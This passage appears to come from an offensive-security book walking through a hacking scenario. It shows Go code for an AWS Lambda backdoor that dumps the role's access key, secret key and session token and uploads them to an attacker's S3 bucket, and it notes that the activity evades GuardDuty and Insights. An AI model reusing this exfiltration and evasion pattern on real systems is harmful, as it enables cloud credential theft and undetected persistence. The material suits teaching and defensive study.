    \ it will log is the trusted service lambda.amazonaws.com impersonating a role\
    \ to execute the Lambda. This is a trivial event inherent to any Lambda execution\
    \ that will go unnoticed by both Insights and GuardDuty.\n\nEverything looks green!\n\
    \n# The Program to Execute\n\nLet’s get to the implementation phase. The program\
    \ that the Lambda will run is a straightforward Go binary that follows the key\
    \ steps just described. The full implementation is available in this book’s repo\
    \ (http://bit.ly/2Oan7I7), so here is a brief overview of the main logic.\n\n\
    Every Go program destined to run in a Lambda environment starts off with the same\
    \ boilerplate main function that registers the Lambda’s entry point (HandleRequest\
    \ in this case):\n\n```\nfunc main() {\n    lambda.Start(HandleRequest)\n}\n```\n\
    \nNext, we have a classic setup to build an HTTP client and create the remote\
    \ S3 URL to submit our response:\n\n```\nconst S3BUCKET=\"mxrads-analytics\"\n\
    func HandleRequest(ctx context.Context, name MyEvent) (string, error) {\n    client\
    \ := &http.Client{}\n    respURL := fmt.Sprintf(\"https://%s.s3.amazonaws.com/setup.txt\"\
    , S3BUCKET)\n```\n\nWe dump the Lambda’s role credentials from environment variables\
    \ and send them to our remote bucket:\n\n```\naccessKey := fmt.Sprintf(`\n   \
    \ AWS_ACCESS_KEY_ID=%s\n    AWS_SECRET_ACCESS_KEY=%s\n    AWS_SESSION_TOKEN=%s`,\n\
    \    os.Getenv(\"AWS_ACCESS_KEY_ID\"),\n    os.Getenv(\"AWS_SECRET_ACCESS_KEY\"\
    ),\n    os.Getenv(\"AWS_SESSION_TOKEN\"),\n)\nuploadToS3(s3Client, S3BUCKET, \"\
    lambda\", accessKey)\n```"
